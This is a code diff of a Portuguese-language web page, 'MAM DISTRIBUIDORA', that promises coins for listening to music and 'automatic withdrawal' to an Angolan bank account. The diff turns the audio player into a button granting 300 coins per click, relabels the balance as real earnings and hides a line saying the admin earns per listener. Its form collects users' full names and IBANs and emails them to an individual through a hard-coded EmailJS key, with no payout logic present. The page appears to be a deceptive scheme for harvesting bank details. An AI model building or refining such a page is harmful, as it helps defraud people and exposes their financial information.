@@ -15,44 +15,36 @@
         .btn-saque { background: #25D366; color: white; }
         .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
         input { width: 90%; padding: 12px; background: #000; border: 1px solid #45a29e; color: white; border-radius: 8px; margin-bottom: 10px; }
-        .track { background: #161b22; padding: 10px; border-radius: 8px; margin-bottom: 10px; text-align: left; }
     </style>
 </head>
 <body>
 
 <header>
     <h1>MAM DISTRIBUIDORA</h1>
-    <small>CONEXÃO VIA SATÉLITE ATIVA</small>
+    <small>CARTEIRA DE GANHOS REAIS</small>
 </header>
 
 <div class="container">
     <div class="card">
-        <div style="font-size: 12px; color: #45a29e;">SALDO EM MOEDAS MAM</div>
+        <div style="font-size: 12px; color: #45a29e;">SALDO DISPONÍVEL</div>
         <div class="saldo"><span id="saldo">0</span> 🪙</div>
         
-        <div class="track">
-            <span style="font-size: 14px; font-weight: bold;">🎧 Música 01 - Oficial</span>
-            <audio style="width:100%; height:30px; margin-top:5px;" controls onended="ganharMoedas()" src="musica1.mp3"></audio>
-        </div>
+        <button class="btn btn-play" onclick="ganharMoedas()">🎧 OUVIR MÚSICA (+300 Moedas)</button>
 
-        <p id="msg-erro" style="color: #ff4d4d; font-size: 12px;">Mínimo para saque: 10.000 moedas</p>
+        <p id="msg-status" style="color: #ff4d4d; font-size: 12px; margin-top:15px;">Mínimo para saque: 10.000 moedas</p>
 
         <hr style="border: 0.5px solid #333; margin: 20px 0;">
         
         <input type="text" id="nome_cliente" placeholder="Teu Nome Completo">
         <input type="text" id="iban_cliente" placeholder="Teu IBAN (Angola)">
         <button id="btnSaque" class="btn btn-saque" onclick="enviarPedidoSaque()" disabled>EFETUAR SAQUE AUTOMÁTICO</button>
-        
-        <div style="font-size: 10px; color: #45a29e; margin-top: 15px;">
-            1 OUVINTE = +5.000 KZ NA CONTA DO ADMIN
-        </div>
     </div>
 </div>
 
 <script>
-    // INICIALIZAÇÃO DO EMAILJS
+    // INICIALIZAÇÃO COM A TUA CHAVE REAL
     (function(){
-        emailjs.init("COLA_AQUI_A_TUA_PUBLIC_KEY"); // <--- BUSCA EM "ACCOUNT" NO EMAILJS
+        emailjs.init("vuAVZ5U4lRBZcsIon");
     })();
 
     let saldo = 0;
@@ -62,8 +54,8 @@
         document.getElementById('saldo').innerText = saldo.toLocaleString();
         if (saldo >= 10000) {
             document.getElementById('btnSaque').disabled = false;
-            document.getElementById('msg-erro').innerText = "SAQUE DISPONÍVEL!";
-            document.getElementById('msg-erro').style.color = "#25D366";
+            document.getElementById('msg-status').innerText = "SAQUE DISPONÍVEL!";
+            document.getElementById('msg-status').style.color = "#25D366";
         }
     }
 
@@ -71,27 +63,27 @@
         const nome = document.getElementById('nome_cliente').value;
         const iban = document.getElementById('iban_cliente').value;
 
-        if (!nome || !iban) { alert("Preencha todos os campos!"); return; }
+        if (!nome || !iban) { alert("Preencha o Nome e o IBAN!"); return; }
 
         const btn = document.getElementById('btnSaque');
-        btn.innerText = "A ENVIAR PARA O ADMIN...";
+        btn.innerText = "A ENVIAR PARA O MATIAS...";
         btn.disabled = true;
 
         const dados = {
-            to_name: "Matias Manuel",
             from_name: nome,
-            message: `Novo pedido de saque! \nValor: ${saldo} moedas \nIBAN: ${iban}`,
-            reply_to: "suporte@mam.com"
+            iban_cliente: iban,
+            valor_moedas: saldo
         };
 
-        // USANDO O TEU SERVICE ID DA FOTO
+        // O Service ID que apareceu na tua foto
+        // ATENÇÃO: Se criaste um template, coloca o ID dele onde diz 'template_id_aqui'
         emailjs.send("service_gmwnj3w", "template_id_aqui", dados)
             .then(function() {
-                alert("PEDIDO RECEBIDO! Matias recebeu o teu pedido e vai confirmar no e-mail.");
+                alert("SUCESSO! Matias recebeu o teu pedido e vai converter para Kwanzas.");
                 saldo = 0;
                 document.getElementById('saldo').innerText = "0";
             }, function(error) {
-                alert("Erro no satélite. Tenta novamente.");
+                alert("Erro ao enviar. Verifique se o Template ID está correto.");
                 btn.disabled = false;
                 btn.innerText = "EFETUAR SAQUE AUTOMÁTICO";
             });
